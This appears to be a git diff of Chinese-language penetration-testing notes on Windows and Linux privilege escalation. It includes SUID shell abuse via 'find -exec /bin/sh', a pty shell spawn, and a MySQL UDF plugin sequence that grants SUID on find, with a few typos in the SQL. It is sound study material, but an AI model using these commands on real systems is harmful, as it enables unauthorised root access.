@@ -583,7 +583,7 @@ WindowsVulnScan
 这个也要powershell在服务器运行脚本，运行完后产生一个json文件(本质就是systeminfo，格式不一样而已)，在执行命令导入这个json文件进行漏扫。
 也可以获取到服务器systeminfo信息，改成它要的格式，在自己电脑运行就可以
 
-
+#### Windows提权
 
 at命令，Windows的计划任务
 计划某某时间打开cmd，任务执行后该窗口是system权限，这是Windows的逻辑漏洞，仅限Win7之前的有用(xp、2003)
@@ -622,9 +622,7 @@ psexec -s cmd
 
 这将在当前计算机上打开一个命令提示符窗口，该窗口已使用系统权限启动。
 
-
-
-数据库提权
+##### 数据库提权
 
 MySql：
 
@@ -635,3 +633,67 @@ MySql：
 
 
 系统溢出漏洞提权
+
+Win2012-烂土豆配合令牌窃取提权-Web权限
+Win2012-DLL劫持提权应用配合MSF-Web权限
+Win2012-不安全的服务权限配合MSF-本地权限
+Win2012-不带引|号服务路径配合MSF-Web,本地权限
+
+#### Linux提权
+
+信息收集脚本：LinEnum.sh、linuxprivchecker.py
+
+给shell脚本执行权限：chmod +x  xxx.sh
+
+信息收集非常重要，可以根据信息直接判断以下提权方式是否可行
+
+漏洞探针：linux-exploit-suggester.sh、linux-exploit-suggester-2.pl(better)
+
+SUID-->set User ID	（Web权限）
+
+1.利用信息收集脚本，查看所有属主为root且具有SetUID权限的文件；2.手工命令: find / -user root -perm -4000 -print 2>/dev/null
+
+	以下是一些可用于产生SHELL的程序：(执行以下程序的时候不管当前用户权限是什么，都会用system权限运行)
+	nmap vim less more nano cp mv find
+	通过执行以上程序的命令获得权限然后拼接我们想要执行的命令
+	如：touch pentestlab
+	find pentestlab -exec whoami  \;
+	使用find命令在当前目录中查找名为pentestlab的文件，并对找到的文件执行whoami命令;反斜杠\的作用是用来转义分号;，确保分号被正确传递给-exec参数，而不被Shell解释为命令的结束符号。这样可以让find命令正确执行-exec参数后面的命令。
+
+内核漏洞（本地权限或web）
+
+```
+提权过程：连接-获取可利用漏洞-下载或上传EXP(一般是C写的)-编译EXP-给权限执行-GG
+这里要用到漏洞探针脚本
+脏牛漏洞
+```
+
+python -c 'import pty; pty.spawn("/bin/bash")'	#python交互式伪终端
+
+环境变量(本地)
+计划任务(crontabs)不安全的定时任务
+
+```
+查看当前用户计划任务：crontab -l
+```
+
+第三方服务
+
+```
+mysql为例
+进入数据库进行UDr导出
+use mysql;
+create table foo(line blob);
+insert into foo values (load file('/tmp/1518.so'));
+select * from foo into dumpfile
+'/usr/lib/mysql/plugin/1518.so';
+创建do_systemk函数调用
+create function do_system returns integer soname '1518.so';
+select  do_system('chmod u+s /usr/bin/find');#给find Suid的执行权限
+#配合使用ind调用执行
+touch xiaodi
+find xiaodi -exec "whoami" \;
+find xiaodi -exec "/bin/sh" \;
+id
+```
+
